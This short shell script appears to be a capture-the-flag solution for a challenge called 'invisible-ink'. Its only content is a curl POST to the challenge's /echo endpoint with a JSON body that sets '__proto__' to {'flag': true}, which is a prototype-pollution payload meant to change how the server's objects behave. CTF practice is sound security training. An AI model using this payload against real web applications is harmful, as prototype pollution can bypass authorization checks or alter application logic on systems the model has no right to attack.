#!/usr/bin/env sh

# http://invisible-ink.apjctf.com/

curl -H "Content-Type: application/json" --request POST \
--data '{"__proto__": {"flag": true} }' \
 http://invisible-ink.apjctf.com/echo
